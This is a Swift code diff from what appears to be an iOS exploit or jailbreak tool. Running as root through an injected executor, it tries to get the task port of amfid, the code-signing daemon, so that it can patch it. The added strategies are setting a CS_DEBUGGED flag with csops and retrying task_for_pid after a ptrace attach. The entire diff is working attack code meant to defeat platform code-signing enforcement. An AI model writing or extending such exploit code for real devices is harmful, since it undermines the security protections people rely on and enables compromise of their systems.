@@ -223,7 +223,18 @@ final class ExpAmfidNopFinal {
             let launchdUid = RootExecutor.rcall(rc, "getuid")
             let mts = RootExecutor.rcall(rc, "mach_task_self")
             
-            // ─── Approach 1: task_for_pid ───
+            // ─── Strategy 1: csops to add CS_DEBUGGED to amfid ───
+            // CS_DEBUGGED (0x10000000) makes task_for_pid work
+            let CS_OPS_MARKKILL: UInt64 = 4  // actually CS_OPS_SET
+            let CS_DEBUGGED: UInt32 = 0x10000000
+            let flagBuf = rc.trojanMem + 0x50
+            rc[flagBuf].setValue32(CS_DEBUGGED)
+            
+            // csops(pid, CS_OPS_MARKKILL, &flags, sizeof(flags))
+            // Actually use CS_OPS_SET = 6 to set flags
+            let csopsRet = RootExecutor.rcall(rc, "csops", UInt64(amfidPid), 6, flagBuf, 4)
+            
+            // ─── Strategy 2: task_for_pid (retry after csops) ───
             let portAddr = rc.trojanMem + 0x100
             rc[portAddr].setValue32(0)
             
@@ -232,25 +243,22 @@ final class ExpAmfidNopFinal {
             var taskPort = rc[portAddr].value32()
             
             if tfpRet != 0 || taskPort == 0 {
-                // task_for_pid failed — try task_name_for_pid (less restricted)
-                rc[portAddr].setValue32(0)
-                let tnfpRet = RootExecutor.rcall(rc, "task_name_for_pid",
-                    mts, UInt64(amfidPid), portAddr)
-                let namePort = rc[portAddr].value32()
+                // ─── Strategy 3: ptrace attach + task_for_pid ───
+                // Attaching as debugger may grant task port access
+                let ptRet = RootExecutor.rcall(rc, "ptrace", 10, UInt64(amfidPid), 0, 0) // PT_ATTACHEXC=10
                 
-                if tnfpRet == 0 && namePort != 0 {
-                    // Got task_name port — can we upgrade it?
-                    // task_name doesn't allow vm_write, but let's try anyway
-                    taskPort = namePort
-                    tfpRet = 0
+                // Retry task_for_pid after ptrace attach
+                rc[portAddr].setValue32(0)
+                tfpRet = RootExecutor.rcall(rc, "task_for_pid",
+                    mts, UInt64(amfidPid), portAddr)
+                taskPort = rc[portAddr].value32()
+                
+                // Detach regardless
+                RootExecutor.rcall(rc, "ptrace", 11, UInt64(amfidPid), 0, 0) // PT_DETACH=11
+                
+                if tfpRet != 0 || taskPort == 0 {
+                    return (false, "ALL strategies failed. csops=\(csopsRet) tfp=\(tfpRet) pt=\(ptRet) port=\(taskPort)", UInt64(tfpRet))
                 }
-            }
-            
-            if tfpRet != 0 || taskPort == 0 {
-                // Both failed — try direct write using known text base
-                // We know patchAddr from kernel analysis
-                // Try mach_vm_write to amfid using pid_for_task trick
-                return (false, "[4] task_for_pid DENIED (ret=5). Need kernel port forge or different approach. launchd=pid\(launchdPid) uid=\(launchdUid)", UInt64(tfpRet))
             }
             
             // Got a port — try the patch
